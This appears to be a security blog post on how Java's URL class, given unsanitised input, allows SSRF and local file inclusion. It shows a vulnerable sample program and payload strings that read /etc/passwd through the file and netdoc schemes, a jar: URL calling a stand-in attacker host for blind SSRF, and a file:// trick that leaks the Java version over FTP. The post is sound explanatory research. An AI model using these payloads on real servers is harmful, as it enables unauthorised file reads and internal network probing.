---
title: "URL eccentricities in java"
date: 2020-11-02T11:11:07+05:30
Description: "LFI using netdoc, file . File makes ftp connections in java which leaks java version to the connecting ftp server"
Tags: [java,web security,lfi]
Categories: [web,java,lfi]
DisableComments: true
---


![IMAGE](/img/java-url/javaurl.png)

## URLConnection
To make a http request or any kind of request of an application layer protocol in java, developers mostly use the URL class that is available. Well if that objects of URL class are vulnerable , attacker can exploit [SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery),[LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerabilites to gain some leads.

Let's consider an example of URLConnection java Program

```
import java.net.*;
import java.io.*;
public class FilePOC
{
      public static void main(String[] args) throws Exception{

            URL url = new URL("<unsafe-input>");

            StringBuilder stringBuilder = new StringBuilder();

            DataInputStream dis = new DataInputStream(url.openConnection().getInputStream());
            String inputLine;

            while ((inputLine = dis.readLine()) != null) {
                System.out.println(inputLine);
            }
            dis.close();

        }
}
```

The above java program makes a URL connection that can be http, https, ftp, file, and jar. The URL Connection is made only when a getInputStream method is called. So now we can give any uri in place of \<unsafe-input\> string.

## SSRF & LFI

The program that is mentioned above is vulnerable to [SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) since we can give ```http://localhost/ssrf``` 
to make a http request to inside of production network since those are basically will be blocked by the production firewalls itself and we are exploiting the server's feature to request an http to the inside servers.

The above program is also vulnerable to [LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) since we can give ```file:///etc/passwd``` 
 and get the files that are in the server itself. well we can read both files and directories.
 
In java 8 versions, netdoc protocol is supported which can be also used to read files and directories from the server. Well a [LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) scenario can be obtained through netdoc protocol also

```netdoc:///etc/passwd```

In java, there is another protocol supported called jar which can be used to perfom blind [SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) attacks. 

```jar:http://localhost!/``` 

```jar:ftp://attack.com!/```


```jar:proto-schema://domain!/```

## leaking java version through file protocol 

In JAVA, file and ftp protocols are supported. So if we issue ```ftp://somedomain/fetch/file``` in URL class and make the connection by opening the input stream, java will send the username as anonymous and password as java version which the jre runs. So if i run the java program in java 8(1.8.0_202) it will send password as java_1.8.0_202. This is the case for ftp , well let us see the case of file protocol 

If we give a file protocol with a domain name like file://domainname/etc/passwd , java makes a ftp connection to the domain name with the default credentials as anonymous:java_version_which_the_program_is_running. Well this is the case i saw in java whereas when we do the same in curl like ```curl file://domainname/etc/passwd``` it just throws an error that file with domain other than localhost is not supported and this is true with python also .

In the case of netdoc, if we give a netdoc protocol such as  ```netdoc://domainname/etc/passwd``` , java does not care about the domainname and it just fetch /etc/passwd from the local server itself. 

Using the above default behaviour of ftp connections which can be invoked from a file protocol is quite interesting and can be used to get the java version which the server is running.


![IMAGE](/img/java-url/leakjavaversion.png)

I have created a poc for leaking java version through file and ftp protocols which is availabe [here](https://github.com/samsbp/java-file-ftp).




